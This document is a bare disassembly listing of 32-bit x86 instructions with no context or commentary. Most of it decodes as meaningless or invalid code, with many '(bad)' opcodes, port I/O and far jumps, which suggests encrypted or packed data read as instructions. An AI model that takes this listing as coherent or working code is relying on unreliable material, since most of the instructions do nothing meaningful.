  426c97:	jmp    0x426cbe
  426c99:	xor    eax,0x658aec17
  426c9e:	add    DWORD PTR ds:0x6ffb0b0f,0x1a
  426ca5:	cmp    ch,BYTE PTR [edx]
  426ca7:	data16 jl 0x426c74
  426caa:	jo     0x426cdf
  426cac:	shl    DWORD PTR [eax+eiz*4],1
  426caf:	daa    
  426cb0:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cb3:	inc    ecx
  426cb4:	inc    edi
  426cb5:	stos   BYTE PTR es:[edi],al
  426cb6:	jmp    0x11a3:0xe9bf0413
  426cbd:	mov    ch,BYTE PTR [edi+0x57]
  426cc0:	add    al,0xbe
  426cc2:	mov    edx,esi
  426cc4:	jle    0x426c8d
  426cc6:	sub    al,0x35
  426cc8:	sbb    edi,DWORD PTR [ebx-0x77338c3e]
  426cce:	gs jecxz 0x426d0d
  426cd1:	jnp    0x426d22
  426cd3:	push   esi
  426cd4:	pop    ecx
  426cd5:	imul   eax,DWORD PTR [eax],0x41
  426cd8:	cmp    DWORD PTR [ecx-0x7c7f6917],0x7bc54b5
  426ce2:	jb     0x426d1d
  426ce4:	xchg   ebx,eax
  426ce5:	add    ebx,esp
  426ce7:	jge    0x426c97
  426ce9:	mov    dh,0xc2
  426ceb:	pop    eax
  426cec:	stos   DWORD PTR es:[edi],eax
  426ced:	cmp    al,0x14
  426cef:	popf   
  426cf0:	aad    0x9e
  426cf2:	adc    ah,BYTE PTR [eax-0x38]
  426cf5:	jne    0x426d12
  426cf7:	jne    0x426d35
  426cf9:	pushf  
  426cfa:	ss cdq 
  426cfc:	xchg   ecx,eax
  426cfd:	lds    edx,FWORD PTR [ecx]
  426cff:	call   0x4388:0xca2774e3
  426d06:	out    dx,al
  426d07:	push   cs
  426d08:	mov    esp,0xfef3beb7
  426d0d:	in     al,dx
  426d0e:	sub    al,0xea
  426d10:	aas    
  426d11:	fcmovbe st,st(1)
  426d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d14:	les    edi,FWORD PTR [edx+0x691d7574]
  426d1a:	jmp    0x4c98bdf3
  426d1f:	mov    ebx,0x622474ad
  426d24:	daa    
  426d25:	hlt    
  426d26:	sub    BYTE PTR [edx-0x6e],bh
  426d29:	out    dx,eax
  426d2a:	mov    BYTE PTR [edx+0x61],ah
  426d2d:	mov    ah,BYTE PTR [ebx-0x7a14f910]
  426d33:	add    cl,bl
  426d35:	(bad)  
  426d36:	pop    ebx
  426d37:	jge    0x426da9
  426d39:	test   al,0xd1
  426d3b:	call   0xeb2b5bbe
  426d40:	and    eax,0x511b9c30
  426d45:	scas   eax,DWORD PTR es:[edi]
  426d46:	aas    
  426d47:	fdiv   DWORD PTR [eax+0x742c1abf]
  426d4d:	mov    ds:0x4c3c2475,eax
  426d52:	ds jne 0x426ce2
  426d55:	push   es
  426d56:	and    eax,0xb8fec270
  426d5b:	ds or  eax,0x13fbb828
  426d61:	adc    ah,cl
  426d63:	aaa    
  426d64:	stos   DWORD PTR es:[edi],eax
  426d65:	aas    
  426d66:	adc    al,0xd1
  426d68:	xchg   ebp,eax
  426d69:	sub    dh,BYTE PTR [edi]
  426d6b:	and    dl,BYTE PTR [eax+ebp*1-0x7bfff719]
  426d72:	ret    
  426d73:	hlt    
  426d74:	dec    edx
  426d75:	dec    ebp
  426d76:	sahf   
  426d77:	pop    ebx
  426d78:	pop    ss
  426d79:	out    0x3b,eax
  426d7b:	aad    0xbb
  426d7d:	ficom  WORD PTR [ebp-0x7cc38852]
  426d83:	xlat   BYTE PTR ds:[ebx]
  426d84:	mov    bh,0x1c
  426d86:	cld    
  426d87:	(bad)  
  426d88:	out    dx,al
  426d89:	dec    ebp
  426d8a:	fmul   st(5),st
  426d8c:	mov    ah,0x67
  426d8e:	push   edi
  426d8f:	mov    ds:0xb8b0f1a5,al
  426d94:	jl     0x426db6
  426d96:	mov    dl,0xd8
  426d98:	jne    0x426d70
  426d9a:	fstp   QWORD PTR [esi+0x266fb36c]
  426da0:	pop    edi
  426da1:	test   BYTE PTR [ecx],0x93
  426da4:	ins    BYTE PTR es:[edi],dx
  426da5:	inc    DWORD PTR [ebx+0x51]
  426da8:	stos   BYTE PTR es:[edi],al
  426da9:	popa   
  426daa:	sbb    eax,esp
  426dac:	daa    
  426dad:	daa    
  426dae:	pop    edi
  426daf:	popa   
  426db0:	jo     0x426d8e
  426db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426db3:	push   ebp
  426db4:	into   
  426db5:	ins    BYTE PTR es:[edi],dx
  426db6:	js     0x426d62
  426db8:	aam    0xb0
  426dba:	xor    ecx,DWORD PTR [edx]
  426dbc:	cdq    
  426dbd:	or     eax,0x2d2192de
  426dc2:	mov    ch,0xc6
  426dc4:	sahf   
  426dc5:	out    0xc2,eax
  426dc7:	mov    ah,0xb8
  426dc9:	jl     0x426d82
  426dcb:	sub    BYTE PTR [esi+0x6d3a2ec8],al
  426dd1:	fistp  DWORD PTR [ecx]
  426dd3:	dec    esi
  426dd4:	adc    al,0x10
  426dd6:	pop    ds
  426dd7:	push   DWORD PTR [eax+0x39adf8a1]
  426ddd:	int3   
  426dde:	aad    0xea
  426de0:	jno    0x426e5c
  426de2:	add    ebx,ebp
  426de4:	(bad)  
  426de5:	into   
  426de6:	sub    esp,DWORD PTR [esi]
  426de8:	mov    esp,ebp
  426dea:	mov    ebp,0xdf992142
  426def:	int3   
  426df0:	or     eax,0xffee8700
  426df5:	push   edx
  426df6:	sub    al,BYTE PTR [eax+0x24aca247]
  426dfc:	sbb    eax,eax
  426dfe:	fld    DWORD PTR ds:0x8b6f58cc
  426e04:	jecxz  0x426e7f
  426e06:	jge    0x426e81
  426e08:	rol    dl,0x4f
  426e0b:	xor    eax,0xd9ecb74b
  426e10:	jo     0x426e82
  426e12:	sub    ebx,DWORD PTR [esi]
  426e14:	mov    BYTE PTR [ecx+esi*8+0x1f3f2e01],dl
  426e1b:	and    bl,cl
  426e1d:	scas   eax,DWORD PTR es:[edi]
  426e1e:	fs sbb eax,0x20157b1
  426e24:	rcr    BYTE PTR [ecx+0x77],cl
  426e27:	jl     0x426df2
  426e29:	adc    dl,BYTE PTR [ebp+0x4c]
  426e2c:	xor    al,0xf4
  426e2e:	test   eax,0xf632b017
  426e33:	jp     0x426e4a
  426e35:	mov    dl,0xbd
  426e37:	pop    eax
  426e38:	sbb    DWORD PTR [edx],0xdd51632a
  426e3e:	cmc    
  426e3f:	loope  0x426e3a
  426e41:	enter  0xd6f8,0x51
  426e45:	adc    eax,0x7f446c0a
  426e4a:	push   ecx
  426e4b:	inc    esi
  426e4c:	push   0x672d0592
  426e51:	or     al,0x23
  426e53:	mov    WORD PTR [ecx-0x627364ba],ss
  426e59:	mov    ch,0xa0
  426e5b:	sbb    bl,BYTE PTR [edi+esi*8-0x54]
  426e5f:	enter  0x9c28,0xa
  426e63:	ins    DWORD PTR es:[edi],dx
  426e64:	or     BYTE PTR [ecx],ch
  426e66:	push   esp
  426e67:	aaa    
  426e68:	iret   
  426e69:	jns    0x426e29
  426e6b:	cmp    BYTE PTR ds:0x73f8e9e4,dl
  426e71:	test   DWORD PTR [edx+ebp*8+0x6f],edx
  426e75:	pop    esp
  426e76:	and    bl,bh
  426e78:	sub    al,0xa8
  426e7a:	stc    
  426e7b:	inc    esp
  426e7c:	mov    eax,ds:0xf900128e
  426e81:	shl    DWORD PTR [edi-0x6b252804],1
  426e87:	pusha  
  426e88:	iret   
  426e89:	mov    edi,eax
  426e8b:	pop    esi
  426e8c:	fucomip st,st(1)
  426e8e:	ins    BYTE PTR es:[edi],dx
  426e8f:	cmp    eax,0x777f927c
  426e94:	inc    ebp
  426e95:	out    0x6a,al
  426e97:	(bad)  
  426e98:	lock push esp
  426e9a:	cmp    al,0x69
  426e9c:	js     0x426eff
  426e9e:	(bad)  
  426e9f:	clc    
  426ea0:	adc    BYTE PTR [ebx-0x11],0xca
  426ea4:	cmc    
  426ea5:	clc    
  426ea6:	inc    ecx
  426ea7:	mov    eax,0xfec37bf1
  426eac:	sar    DWORD PTR [edx],cl
  426eae:	add    dh,BYTE PTR [esi+eiz*8]
  426eb1:	mov    dh,0x8c
  426eb3:	sub    dh,BYTE PTR [eax+esi*1+0xf99e7f8]
  426eba:	jl     0x426eba
  426ebc:	popa   
  426ebd:	sub    ch,BYTE PTR [eax+0x6b9e6c06]
  426ec3:	mov    edi,0x37e6ea51
  426ec8:	sbb    DWORD PTR [ecx+0x21bbf9f4],edi
  426ece:	mov    bh,0xf7
  426ed0:	xchg   ebx,eax
  426ed1:	jecxz  0x426edf
  426ed3:	cs out 0x61,al
  426ed6:	inc    esp
  426ed7:	jp     0x426e65
  426ed9:	mov    BYTE PTR [eax-0x68],ch
  426edc:	ret    0x83dd
  426edf:	jo     0x426ed3
  426ee1:	push   0xffffffd3
  426ee3:	call   0xff3150f2
  426ee8:	ja     0x426ec9
  426eea:	shl    BYTE PTR [eax+0x541d2a0b],0xa5
  426ef1:	out    0x53,eax
  426ef3:	xchg   ebp,eax
  426ef4:	jge    0x426ed7
  426ef6:	sahf   
  426ef7:	repz scas eax,DWORD PTR es:[edi]
  426ef9:	pop    esi
  426efa:	(bad)  
  426efb:	(bad)  
  426efc:	ss pop es
  426efe:	push   esp
  426eff:	jmp    0xbeebaccc
  426f04:	mov    WORD PTR [esi-0x2d],gs
  426f07:	mov    eax,0x3c6cfd6e
  426f0c:	ds ins BYTE PTR es:[edi],dx
  426f0e:	(bad)  
  426f0f:	int3   
  426f10:	jl     0x426f08
  426f12:	int    0x1e
  426f14:	sub    dl,BYTE PTR [ebp-0x2543e4e]
  426f1a:	daa    
  426f1b:	or     dl,ch
  426f1d:	sub    al,0x73
  426f1f:	dec    esi
  426f20:	inc    edx
  426f21:	addr16 aas 
  426f23:	outs   dx,DWORD PTR ds:[esi]
  426f24:	xchg   ecx,eax
  426f25:	jmp    0xfde31cf4
  426f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f2b:	inc    ebp
  426f2c:	xor    ebp,ebp
  426f2e:	mov    al,0x73
  426f30:	adc    edi,esi
  426f32:	mov    edx,0xa28ecfb3
  426f37:	stos   BYTE PTR es:[edi],al
  426f38:	inc    edx
  426f39:	dec    ebx
  426f3a:	hlt    
  426f3b:	xchg   esi,eax
  426f3c:	stos   BYTE PTR es:[edi],al
  426f3d:	mov    al,ds:0xbbb9169e
  426f42:	inc    eax
  426f43:	xor    BYTE PTR [ecx-0x6e8e3415],bl
  426f49:	jno    0x426f1b
  426f4b:	mov    ebp,0xed8f3bed
  426f50:	fcmovnbe st,st(4)
  426f52:	add    BYTE PTR es:[edi],al
  426f55:	push   edx
  426f56:	jae    0x426f15
  426f58:	sti    
  426f59:	test   al,0x47
  426f5b:	jae    0x426fb3
  426f5d:	addr16 ja 0x426fd8
  426f60:	repnz arpl WORD PTR [ebp-0x7d6cc1bf],di
  426f67:	bound  esp,QWORD PTR [esi+0x78]
  426f6a:	iret   
  426f6b:	iret   
  426f6c:	pushf  
  426f6d:	mov    ds:0x7b2cb47b,al
  426f72:	sub    eax,0x28304e5e
  426f77:	push   ecx
  426f78:	(bad)  
  426f79:	data16 jno 0x426f88
  426f7c:	shl    DWORD PTR [edi+0x2822455],1
  426f82:	ror    BYTE PTR [ecx+eax*1],cl
  426f85:	mov    al,ds:0x3db226dd
  426f8a:	out    dx,eax
  426f8b:	ins    BYTE PTR es:[edi],dx
  426f8c:	mov    DWORD PTR [ebx-0x47594e07],ebx
  426f92:	mov    ah,0x2b
  426f94:	aas    
  426f95:	pop    ecx
  426f96:	mov    BYTE PTR [ebx+0x7f],ch
  426f99:	cmp    edx,DWORD PTR [esi]
  426f9b:	popf   
  426f9c:	into   
  426f9d:	sbb    eax,0x319c647
  426fa2:	push   ss
  426fa3:	int    0x3a
  426fa5:	cs ins BYTE PTR es:[edi],dx
  426fa7:	popa   
  426fa8:	(bad)  
  426fa9:	ja     0x427007
  426fab:	mov    edi,0x9de45de9
  426fb0:	or     BYTE PTR [edi-0x1db28d03],bl
  426fb6:	ss xchg edx,eax
  426fb8:	mov    edi,0x1fad3808
  426fbd:	das    
  426fbe:	sbb    al,BYTE PTR [edx-0x77862d33]
  426fc4:	inc    edx
  426fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fc6:	push   0xf7aedf79
  426fcb:	mov    esp,ecx
  426fcd:	and    DWORD PTR [esi+0x17daf039],edi
  426fd3:	fwait
  426fd4:	push   ss
  426fd5:	push   eax
  426fd6:	sbb    eax,0x6b23ccc7
  426fdb:	imul   ebp,DWORD PTR [ebp+0x1eb1f33e],0x964cbb3d
  426fe5:	and    DWORD PTR [esi-0x5e9c43bc],eax
  426feb:	mov    eax,ds:0x67311c40
  426ff0:	push   ds
  426ff1:	sub    bh,BYTE PTR [ebx+edx*2]
  426ff4:	mov    dl,0xa1
  426ff6:	lea    esp,[ebx+ecx*2+0x36c1097e]
  426ffd:	lods   eax,DWORD PTR ds:[esi]
  426ffe:	test   DWORD PTR [esi-0x7a],ebx
  427001:	call   0x6a6cd67e
  427006:	lahf   
  427007:	inc    ebp
  427008:	or     ecx,DWORD PTR [edx-0x68f8feb0]
  42700e:	arpl   WORD PTR [edi+0x41fb5202],si
  427014:	push   ds
  427015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427016:	xor    DWORD PTR [eax],ebx
  427018:	mov    ds:0x2c632855,al
  42701d:	popf   
  42701e:	fcmovb st,st(4)
  427020:	mov    esi,0xd0bad0fe
  427025:	ret    0x5a49
  427028:	icebp  
  427029:	clc    
  42702a:	hlt    
  42702b:	jp     0x426fcc
  42702d:	test   al,0xf1
  42702f:	fisub  DWORD PTR [ebp+0x7d]
  427032:	test   eax,0x35c273a5
  427037:	test   al,0xe1
  427039:	mov    esi,0x5f1c8be0
  42703e:	ins    DWORD PTR es:[edi],dx
  42703f:	(bad)  
  427040:	enter  0xb9e,0x90
  427044:	jecxz  0x427077
  427046:	inc    ebx
  427047:	aas    
  427048:	cmp    al,0x5d
  42704a:	cs mov bl,0x19
  42704d:	or     BYTE PTR [eax+0x36d83e28],dl
  427053:	cmp    ch,BYTE PTR [edi-0x70c2ca6b]
  427059:	ficom  WORD PTR [ebp-0x716a567a]
  42705f:	mov    al,ds:0x31965f1d
  427064:	jnp    0x42707a
  427066:	or     BYTE PTR ds:[edi-0x7a2ef41a],0xa1
  42706e:	ins    DWORD PTR es:[edi],dx
  42706f:	nop
  427070:	packuswb mm0,QWORD PTR [ebx]
  427073:	stos   BYTE PTR es:[edi],al
  427074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427075:	xchg   ebx,eax
  427076:	jmp    0x427008
  427078:	push   0x70
  42707a:	add    DWORD PTR [esi],0xffffffde
  42707d:	xchg   BYTE PTR [ecx+0x4148be64],bl
  427083:	lock inc esp
  427085:	fldenv [eax]
  427087:	mov    ebp,0x4ed44780
  42708c:	ds leave 
  42708e:	and    BYTE PTR [esi-0x4b],cl
  427091:	pop    ecx
  427092:	pop    esp
  427093:	test   eax,0x3b2026b1
  427098:	arpl   WORD PTR [ebx+ebx*1-0x21c63590],dx
  42709f:	lahf   
  4270a0:	and    al,0xb5
  4270a2:	int3   
  4270a3:	repz sub BYTE PTR [ebx+ebx*4-0x435600fa],0xe8
  4270ac:	mov    eax,0x7adeb098
  4270b1:	aam    0x8d
  4270b3:	xchg   esp,eax
  4270b4:	scas   al,BYTE PTR es:[edi]
  4270b5:	mov    edi,0x9f1831b7
  4270ba:	sbb    eax,0x99f9ce9e
  4270bf:	mov    ss,WORD PTR [edi+0x9]
  4270c2:	test   DWORD PTR [edi],0xe5be4ef
  4270c8:	test   al,0xb2
  4270ca:	cli    
  4270cb:	pop    edi
  4270cc:	mov    esi,0x3c0f2cdb
  4270d1:	sbb    esp,eax
  4270d3:	xchg   BYTE PTR [esi],bl
  4270d5:	cmc    
  4270d6:	dec    ecx
  4270d7:	loope  0x427099
  4270d9:	xchg   esp,eax
  4270da:	jl     0x4270c2
  4270dc:	iret   
  4270dd:	jp     0x427139
  4270df:	repnz push 0x8b9978b3
  4270e5:	push   eax
  4270e6:	lods   al,BYTE PTR ds:[esi]
  4270e7:	les    ecx,FWORD PTR [ebx-0x16295907]
  4270ed:	addr16 mov ebp,0xa759c0b1
  4270f3:	lock dec si
  4270f6:	push   ebp
  4270f7:	xor    edi,DWORD PTR [eax+0x258daed2]
  4270fd:	inc    eax
  4270fe:	or     BYTE PTR [edx],0x21
  427101:	lods   al,BYTE PTR ds:[esi]
  427102:	adc    BYTE PTR [eax-0x40],dl
  427105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427106:	nop
  427107:	add    ah,BYTE PTR [edx+0x3d9abdf4]
  42710d:	and    al,0xf3
  42710f:	xchg   ecx,eax
  427110:	sub    esp,DWORD PTR [esi]
  427112:	das    
  427113:	lahf   
  427114:	ret    0x3fcc
  427117:	sub    eax,0x5ed69120
  42711c:	popa   
  42711d:	pop    ecx
  42711e:	dec    eax
  42711f:	les    esi,FWORD PTR [edi-0x7993c9fa]
  427125:	lahf   
  427126:	xor    bl,0x79
  427129:	or     dh,BYTE PTR [ebp+ebx*4-0x70dafd15]
  427130:	mov    WORD PTR [eax],ss
  427132:	test   DWORD PTR [ecx],ebp
  427134:	jnp    0x4270e6
  427136:	mov    DWORD PTR [ecx-0x7],edi
  427139:	sbb    al,0xee
  42713b:	int    0x60
  42713d:	xchg   esi,eax
  42713e:	add    cl,dh
  427140:	(bad)  
  427141:	xor    edx,DWORD PTR [esi-0x19]
  427144:	jecxz  0x4271a3
  427146:	mov    edx,edi
  427148:	adc    DWORD PTR [ecx-0x6b],0x24
  42714c:	pushf  
  42714d:	mov    al,ds:0xa76cb88
  427152:	pop    esi
  427153:	mov    ebp,0xc9745024
  427158:	jbe    0x4270fe
  42715a:	fstp   QWORD PTR [ebp+0x250484b3]
  427160:	sbb    DWORD PTR [edi+0x53],esp
  427163:	add    bh,BYTE PTR [edi+0x75]
  427166:	push   0x7f
  427168:	mov    esi,0x67155d00
  42716d:	adc    eax,0xcce83b40
  427172:	enter  0x9de0,0x3a
  427176:	dec    ebx
  427177:	adc    al,0xa
  427179:	sub    ebx,DWORD PTR [edx-0x3944b9ad]
  42717f:	loopne 0x4271cf
  427181:	and    bh,dh
  427183:	adc    eax,DWORD PTR [edi-0x64]
  427186:	(bad)  
  427187:	mov    ds:0xc0d48a66,al
  42718c:	sub    al,0x44
  42718e:	fs repnz mov esi,0xf6cb0e8a
  427195:	lods   eax,DWORD PTR ds:[esi]
  427196:	ror    DWORD PTR [esi],cl
  427198:	inc    edx
  427199:	push   eax
  42719a:	aam    0x93
  42719c:	arpl   cx,bp
  42719e:	pop    esp
  42719f:	pop    ss
  4271a0:	leave  
  4271a1:	jmp    0x38b123c1
  4271a6:	arpl   WORD PTR [eax],bx
  4271a8:	mov    edi,0xb2d9ae9a
  4271ad:	adc    al,BYTE PTR [ecx+0x551c989a]
  4271b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271b4:	adc    eax,0xbdf13568
  4271b9:	loop   0x4271b6
  4271bb:	push   edi
  4271bc:	cmp    BYTE PTR [eax-0x6203e68e],0x7
  4271c3:	push   ebp
  4271c4:	aad    0x1
  4271c6:	mov    edx,edx
  4271c8:	xchg   BYTE PTR [ebx+eax*1-0x1f271843],bh
  4271cf:	sbb    al,0x9f
  4271d1:	sub    BYTE PTR [eax+ebx*2-0x2a],dl
  4271d5:	mov    ebp,0x4d3a4c35
  4271da:	sbb    eax,0xba4eac1c
  4271df:	dec    ebp
  4271e0:	cs pop ss
  4271e2:	pop    edi
  4271e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271e4:	jbe    0x427241
  4271e6:	pop    ss
  4271e7:	popf   
  4271e8:	inc    esi
  4271e9:	push   cs
  4271ea:	dec    esi
  4271eb:	mov    ds,ecx
  4271ed:	add    al,0x2b
  4271ef:	aaa    
  4271f0:	stc    
  4271f1:	ins    BYTE PTR es:[edi],dx
  4271f2:	imul   esp,DWORD PTR ds:0xfc395494,0x1e
  4271f9:	fs imul ebp,ecx,0xfe514a45
  427200:	ret    
  427201:	jp     0x42727e
  427203:	push   cs
  427204:	cmc    
  427205:	inc    esi
  427206:	loop   0x427218
  427208:	jns    0x427242
  42720a:	loope  0x42721d
  42720c:	push   cs
  42720d:	xchg   ecx,eax
  42720e:	mov    al,ds:0x1d7bc837
  427213:	sbb    ecx,DWORD PTR [eax+0x19]
  427216:	mov    ebx,0x554eeef4
  42721b:	cdq    
  42721c:	mov    eax,0xa81e23
	...
  427229:	add    BYTE PTR [ebp+0x55],cl
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
  4272ea:	add    BYTE PTR [ebp-0x18],cl
  4272ed:	xor    ebp,DWORD PTR [edx]
  4272ef:	add    eax,DWORD PTR [eax]
  4272f1:	mov    eax,eax
  4272f3:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4272fa:	inc    ebp
  4272fb:	mov    DWORD PTR [ebx+0x459408],ecx
  427301:	popa   
  427302:	mov    esp,DWORD PTR [ebp-0x75]
  427305:	(bad)  
  427306:	cld    
  427307:	inc    eax
  427308:	cmp    bh,0x1
  42730b:	lea    eax,[eax]
  42730d:	and    BYTE PTR [eax],al
  42730f:	inc    DWORD PTR [ecx-0x18]
  427312:	mov    ecx,DWORD PTR [ebx]
  427314:	cld    
  427315:	add    BYTE PTR [ecx+0x75014d],cl
  42731b:	(bad)  
  42731c:	xchg   ebp,eax
  42731d:	sar    bh,1
  42731f:	inc    eax
  427320:	inc    DWORD PTR [eax]
  427322:	mov    eax,DWORD PTR [ebp-0x4]
  427325:	xor    edx,DWORD PTR [edx+0x7201be]
  42732b:	add    BYTE PTR [edx],dl
  42732d:	(bad)  
  42732e:	nop
  42732f:	inc    ebp
  427330:	add    BYTE PTR [ebx-0x5afb0c00],cl
  427336:	mov    al,0xff
  427338:	add    bh,bh
  42733a:	add    BYTE PTR [ebx],dh
  42733c:	inc    DWORD PTR [ebx]
  42733e:	sbb    al,0x89
  427340:	jne    0x42731e
  427342:	mov    esp,DWORD PTR [ecx+0x4500fc]
  427348:	mov    eax,DWORD PTR [ebp-0xff0048]
  42734e:	mov    DWORD PTR [eax-0x70],0xee70ed89
  427355:	inc    DWORD PTR [ebp-0x75]
  427358:	fisttp QWORD PTR [eax+ebp*8]
  42735b:	test   DWORD PTR [esi-0x1],esp
  42735e:	inc    ebp
  42735f:	(bad)  
  427360:	aas    
  427361:	inc    ebp
  427362:	(bad)  
  427363:	lea    edi,[eax+edi*2-0x1]
  427367:	inc    edi
  427369:	mov    DWORD PTR ds:0x8000c7a0,edi
  42736f:	mov    ebp,esi
  427371:	cld    
  427372:	in     al,0x8d
  427374:	inc    ebp
  427375:	(bad)  
  427376:	call   0xc7cb537a
  42737b:	add    DWORD PTR [eax-0x11ba1500],ecx
  427381:	inc    DWORD PTR [ebp-0x4]
  427384:	out    0x8d,eax
  427386:	aas    
  427387:	(bad)  
  427388:	call   0xca9e8c
  42738d:	add    DWORD PTR [ebx-0x7f570400],ecx
  427393:	add    BYTE PTR [ecx],al
  427395:	test   DWORD PTR [eax],eax
  427397:	wrmsr  
  427399:	jae    0x427388
  42739b:	add    BYTE PTR [eax],al
  42739d:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4273a3:	add    esp,edi
  4273a5:	add    BYTE PTR [eax+0x450108],al
  4273ab:	mov    edi,DWORD PTR [ebp-0x6c]
  4273ae:	add    DWORD PTR [eax],0x4
  4273b1:	mov    eax,DWORD PTR [ebp+0x3]
  4273b4:	mov    edi,DWORD PTR [esp+edi*8]
  4273b7:	dec    ebp
  4273b8:	nop
  4273b9:	mov    eax,DWORD PTR [ecx]
  4273bb:	fadd   DWORD PTR [eax]
  4273bd:	add    BYTE PTR [esi],al
  4273bf:	lea    eax,[eax]
  4273c1:	pusha  
  4273c2:	push   eax
  4273c3:	inc    DWORD PTR [ebp+0x52]
  4273c6:	call   DWORD PTR [ebp-0x7b]
  4273c9:	mov    esi,DWORD PTR [ebp-0x74]
  4273cc:	mov    eax,DWORD PTR [eax]
  4273ce:	cld    
  4273cf:	mov    eax,DWORD PTR [eax+0x880103]
  4273d5:	add    BYTE PTR [ebp+0x6a],bh
  4273d8:	cmp    edi,0x10
  4273db:	mov    WORD PTR [ebp+0x0],es
  4273de:	mov    edx,DWORD PTR [edx-0x4]
  4273e1:	push   ecx
  4273e2:	nop
  4273e3:	inc    DWORD PTR [ecx]
  4273e5:	cld    
  4273e6:	add    BYTE PTR [ebp-0x24],bh
  4273e9:	mov    eax,DWORD PTR [eax]
  4273eb:	cld    
  4273ec:	push   eax
  4273ed:	nop
  4273ee:	inc    ebp
  4273ef:	add    edi,edi
  4273f1:	add    BYTE PTR [ebx+0x4de4f445],cl
  4273f7:	in     al,dx
  4273f8:	xor    eax,edi
  4273fa:	add    edx,DWORD PTR [ebx+edi*1+0x36e70feb]
  427401:	mov    DWORD PTR [eax],0xb8788b98
  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
